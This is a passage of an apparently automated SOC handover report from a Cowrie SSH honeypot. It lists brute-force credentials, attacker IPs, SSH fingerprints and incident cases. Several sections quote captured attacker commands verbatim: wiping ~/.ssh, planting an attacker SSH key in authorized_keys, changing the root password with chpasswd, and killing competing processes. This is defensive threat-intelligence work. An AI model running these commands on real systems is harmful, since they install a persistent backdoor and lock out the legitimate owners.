# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-22 |
| **Generated At** | 2026-05-22T14:47:10Z |
| **Shift Time** | 14:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **173** |
| Confirmed Threats | **133** |
| False Positives Filtered | **40** (23.1%) |
| Unique Attacker IPs | **45** |
| Countries of Origin | **19** |
| High Severity Cases | **45** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **128** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **99** |
| Unique Credential Pairs | **59** |
| Unique Usernames | **35** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **35** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 46 |
| `345gs5662d34` | 20 |
| `lijie` | 1 |
| `vncuser` | 1 |
| `shubham` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 21 |
| `345gs5662d34` | 20 |
| `123456` | 5 |
| `alex` | 2 |
| `admin@321` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 21 |
| `345gs5662d34` | `345gs5662d34` | 20 |
| `root` | `admin@321` | 2 |
| `root` | `000000000` | 1 |
| `root` | `alex` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `000000000` | `101.36.108.213` | 2026-05-22T10:55:39 |
| `root` | `3245gs5662d34` | `101.36.108.213` | 2026-05-22T10:55:42 |
| `root` | `alex` | `101.36.108.213` | 2026-05-22T10:59:38 |
| `root` | `qwerty123!@#` | `101.36.108.213` | 2026-05-22T11:11:41 |
| `root` | `hanseatic` | `101.36.108.213` | 2026-05-22T11:15:38 |
| `root` | `admin` | `218.157.205.238` | 2026-05-22T11:23:00 |
| `root` | `123qwe.` | `46.17.99.102` | 2026-05-22T12:03:36 |
| `root` | `3245gs5662d34` | `46.17.99.102` | 2026-05-22T12:03:39 |
| `root` | `Welkom123` | `180.184.43.90` | 2026-05-22T12:10:37 |
| `root` | `A@12345678` | `155.4.244.107` | 2026-05-22T12:19:32 |
| `root` | `3245gs5662d34` | `155.4.244.107` | 2026-05-22T12:19:39 |
| `root` | `A12345@` | `222.107.254.110` | 2026-05-22T12:22:35 |
| `root` | `3245gs5662d34` | `222.107.254.110` | 2026-05-22T12:22:39 |
| `root` | `admin@321` | `102.218.89.110` | 2026-05-22T12:27:56 |
| `root` | `3245gs5662d34` | `102.218.89.110` | 2026-05-22T12:28:03 |
| `root` | `ZAQ!xsw2cde3` | `194.233.91.154` | 2026-05-22T13:17:20 |
| `root` | `3245gs5662d34` | `194.233.91.154` | 2026-05-22T13:17:25 |
| `root` | `l123456.` | `102.88.137.80` | 2026-05-22T13:43:24 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-05-22T13:43:31 |
| `root` | `rootroot01` | `95.71.127.158` | 2026-05-22T13:50:04 |
| `root` | `pan` | `102.88.137.80` | 2026-05-22T13:50:52 |
| `root` | `!QAZXSW@123` | `95.71.127.158` | 2026-05-22T13:58:04 |
| `root` | `3245gs5662d34` | `95.71.127.158` | 2026-05-22T13:58:25 |
| `root` | `123qweASDzxc` | `102.88.137.80` | 2026-05-22T14:00:18 |
| `root` | `25251325` | `102.88.137.80` | 2026-05-22T14:02:07 |
| `root` | `A1qwerty` | `47.85.18.171` | 2026-05-22T14:30:24 |
| `root` | `3245gs5662d34` | `47.85.18.171` | 2026-05-22T14:30:29 |
| `root` | `cc123456` | `47.85.18.171` | 2026-05-22T14:31:00 |
| `root` | `Gz123456` | `47.85.18.171` | 2026-05-22T14:31:35 |
| `root` | `Server123` | `47.85.18.171` | 2026-05-22T14:32:40 |
| `root` | `666666` | `101.36.106.162` | 2026-05-22T14:33:37 |
| `root` | `3245gs5662d34` | `101.36.106.162` | 2026-05-22T14:33:40 |
| `root` | `mudar123` | `186.103.169.12` | 2026-05-22T14:44:15 |
| `root` | `3245gs5662d34` | `186.103.169.12` | 2026-05-22T14:44:22 |
| `root` | `admin@321` | `101.36.106.162` | 2026-05-22T14:45:04 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **173** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 114 |
| Paramiko (Python) | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 58 | 14 |
| `03a80b21afa8...` | Modern SSH client | 23 | 4 |
| `713bd9cc9355...` | Mirai/variant | 23 | 1 |
| `af8223ac9914...` | libssh-based | 3 | 3 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 58 | 14 | Mirai/variant |
| `03a80b21afa8...` | libssh | 23 | 4 | Modern SSH client |
| `713bd9cc9355...` | libssh | 23 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 4 | — |
| `af8223ac9914...` | libssh | 3 | 3 | libssh-based |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Rm5xofTu80DR"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.184.43.90`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ijbBir9BmNx4"|chpasswd|bash
```
```
top
```
Source IPs: `95.71.127.158`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.218.89.110`, `155.4.244.107`, `186.103.169.12`, `47.85.18.171`, `101.36.108.213`, `222.107.254.110`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **45** |
| Unique ASNs | **31** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 6 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 5 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS14618` | Amazon.com, Inc. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS134768` | CHINANET SHAANXI province Cloud Base network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (45)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7a2fa6d46bb8

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:55 |
| **Last Seen** | 2026-05-22 10:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:55:38` | `cowrie.session.connect` |
| `2026-05-22 10:55:38` | `cowrie.client.version` |
| `2026-05-22 10:55:38` | `cowrie.client.kex` |
| `2026-05-22 10:55:39` | `cowrie.login.success` |
| `2026-05-22 10:55:39` | `cowrie.session.params` |
| `2026-05-22 10:55:39` | `cowrie.command.input` |
| `2026-05-22 10:55:39` | `cowrie.command.failed` |
| `2026-05-22 10:55:39` | `cowrie.log.closed` |
| `2026-05-22 10:55:39` | `cowrie.session.params` |
| `2026-05-22 10:55:39` | `cowrie.command.input` |
| `2026-05-22 10:55:40` | `cowrie.session.file_download` |
| `2026-05-22 10:55:40` | `cowrie.log.closed` |
| `2026-05-22 10:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecc550c7818e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:55 |
| **Last Seen** | 2026-05-22 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:55:42` | `cowrie.session.connect` |
| `2026-05-22 10:55:42` | `cowrie.client.version` |
| `2026-05-22 10:55:42` | `cowrie.client.kex` |
| `2026-05-22 10:55:42` | `cowrie.login.success` |
| `2026-05-22 10:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1dd66cfc07

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:59 |
| **Last Seen** | 2026-05-22 10:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:59:38` | `cowrie.session.connect` |
| `2026-05-22 10:59:38` | `cowrie.client.version` |
| `2026-05-22 10:59:38` | `cowrie.client.kex` |
| `2026-05-22 10:59:38` | `cowrie.login.success` |
| `2026-05-22 10:59:38` | `cowrie.session.params` |
| `2026-05-22 10:59:38` | `cowrie.command.input` |
| `2026-05-22 10:59:38` | `cowrie.command.failed` |
| `2026-05-22 10:59:39` | `cowrie.log.closed` |
| `2026-05-22 10:59:39` | `cowrie.session.params` |
| `2026-05-22 10:59:39` | `cowrie.command.input` |
| `2026-05-22 10:59:39` | `cowrie.session.file_download` |
| `2026-05-22 10:59:39` | `cowrie.log.closed` |
| `2026-05-22 10:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e763b58f3ebc

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 10:59 |
| **Last Seen** | 2026-05-22 10:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 10:59:41` | `cowrie.session.connect` |
| `2026-05-22 10:59:41` | `cowrie.client.version` |
| `2026-05-22 10:59:41` | `cowrie.client.kex` |
| `2026-05-22 10:59:41` | `cowrie.login.success` |
| `2026-05-22 10:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-950cc092a4df

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 11:11 |
| **Last Seen** | 2026-05-22 11:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 11:11:41` | `cowrie.session.connect` |
| `2026-05-22 11:11:41` | `cowrie.client.version` |
| `2026-05-22 11:11:41` | `cowrie.client.kex` |
| `2026-05-22 11:11:41` | `cowrie.login.success` |
| `2026-05-22 11:11:41` | `cowrie.session.params` |
| `2026-05-22 11:11:41` | `cowrie.command.input` |
| `2026-05-22 11:11:41` | `cowrie.command.failed` |
| `2026-05-22 11:11:41` | `cowrie.log.closed` |
| `2026-05-22 11:11:42` | `cowrie.session.params` |
| `2026-05-22 11:11:42` | `cowrie.command.input` |
| `2026-05-22 11:11:42` | `cowrie.session.file_download` |
| `2026-05-22 11:11:42` | `cowrie.log.closed` |
| `2026-05-22 11:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f3d3d210f99

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 11:11 |
| **Last Seen** | 2026-05-22 11:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 11:11:43` | `cowrie.session.connect` |
| `2026-05-22 11:11:43` | `cowrie.client.version` |
| `2026-05-22 11:11:44` | `cowrie.client.kex` |
| `2026-05-22 11:11:44` | `cowrie.login.success` |
| `2026-05-22 11:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea099bda58d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 11:15 |
| **Last Seen** | 2026-05-22 11:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 11:15:38` | `cowrie.session.connect` |
| `2026-05-22 11:15:38` | `cowrie.client.version` |
| `2026-05-22 11:15:38` | `cowrie.client.kex` |
| `2026-05-22 11:15:38` | `cowrie.login.success` |
| `2026-05-22 11:15:38` | `cowrie.session.params` |
| `2026-05-22 11:15:38` | `cowrie.command.input` |
| `2026-05-22 11:15:38` | `cowrie.command.failed` |
| `2026-05-22 11:15:39` | `cowrie.log.closed` |
| `2026-05-22 11:15:39` | `cowrie.session.params` |
| `2026-05-22 11:15:39` | `cowrie.command.input` |
| `2026-05-22 11:15:39` | `cowrie.session.file_download` |
| `2026-05-22 11:15:39` | `cowrie.log.closed` |
| `2026-05-22 11:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f15cc49f0e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]213` |
| **First Seen** | 2026-05-22 11:15 |
| **Last Seen** | 2026-05-22 11:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 11:15:41` | `cowrie.session.connect` |
| `2026-05-22 11:15:41` | `cowrie.client.version` |
| `2026-05-22 11:15:41` | `cowrie.client.kex` |
| `2026-05-22 11:15:41` | `cowrie.login.success` |
| `2026-05-22 11:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]213` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae0a5835919a

| Field | Detail |
|---|---|
| **Source IP** | `218.157.205[.]238` |
| **First Seen** | 2026-05-22 11:22 |
| **Last Seen** | 2026-05-22 11:23 |
| **Session Duration** | 28s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 11:22:58` | `cowrie.session.connect` |
| `2026-05-22 11:22:58` | `cowrie.client.version` |
| `2026-05-22 11:22:58` | `cowrie.client.kex` |
| `2026-05-22 11:22:58` | `cowrie.login.failed` |
| `2026-05-22 11:23:00` | `cowrie.login.success` |
| `2026-05-22 11:23:00` | `cowrie.session.params` |
| `2026-05-22 11:23:00` | `cowrie.command.input` |
| `2026-05-22 11:23:00` | `cowrie.command.failed` |
| `2026-05-22 11:23:00` | `cowrie.log.closed` |
| `2026-05-22 11:23:00` | `cowrie.session.params` |
| `2026-05-22 11:23:00` | `cowrie.command.input` |
| `2026-05-22 11:23:01` | `cowrie.log.closed` |
| `2026-05-22 11:23:01` | `cowrie.session.params` |
| `2026-05-22 11:23:01` | `cowrie.command.input` |
| `2026-05-22 11:23:01` | `cowrie.log.closed` |
| `2026-05-22 11:23:01` | `cowrie.session.params` |
| `2026-05-22 11:23:01` | `cowrie.command.input` |
| `2026-05-22 11:23:02` | `cowrie.log.closed` |
| `2026-05-22 11:23:02` | `cowrie.session.params` |
| `2026-05-22 11:23:02` | `cowrie.command.input` |
| `2026-05-22 11:23:02` | `cowrie.log.closed` |
| `2026-05-22 11:23:02` | `cowrie.session.params` |
| `2026-05-22 11:23:02` | `cowrie.command.input` |
| `2026-05-22 11:23:02` | `cowrie.log.closed` |
| `2026-05-22 11:23:03` | `cowrie.session.params` |
| `2026-05-22 11:23:03` | `cowrie.command.input` |
| `2026-05-22 11:23:03` | `cowrie.log.closed` |
| `2026-05-22 11:23:03` | `cowrie.session.params` |
| `2026-05-22 11:23:03` | `cowrie.command.input` |
| `2026-05-22 11:23:03` | `cowrie.log.closed` |
| `2026-05-22 11:23:04` | `cowrie.session.params` |
| `2026-05-22 11:23:04` | `cowrie.command.input` |
| `2026-05-22 11:23:04` | `cowrie.log.closed` |
| `2026-05-22 11:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.157.205[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.157.205[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2204a8a772f9

| Field | Detail |
|---|---|
| **Source IP** | `46.17.99[.]102` |
| **First Seen** | 2026-05-22 12:03 |
| **Last Seen** | 2026-05-22 12:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 12:03:35` | `cowrie.session.connect` |
| `2026-05-22 12:03:35` | `cowrie.client.version` |
| `2026-05-22 12:03:35` | `cowrie.client.kex` |
